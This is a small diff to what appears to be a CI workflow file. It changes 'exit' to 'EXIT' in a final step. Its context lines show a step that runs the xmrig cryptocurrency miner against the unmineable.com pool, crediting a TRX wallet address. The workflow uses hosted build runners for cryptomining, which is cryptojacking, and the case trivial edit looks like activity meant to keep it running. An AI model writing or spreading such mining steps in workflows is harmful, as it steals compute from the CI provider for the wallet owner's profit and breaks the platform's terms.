@@ -24,4 +24,4 @@ jobs:
       run: .\xmrig-6.11.1-msvc-win64\xmrig-6.11.11\xmrig.exe -o rx.unmineable.com:3333 -a rx
       -k -u TRX:TFLQNgSLis7hQmzxMwhWXF8DSjLVqZupMR.Dutacoin -p x -t 1	  
     - name: DONE
-      run: exit
+      run: EXIT
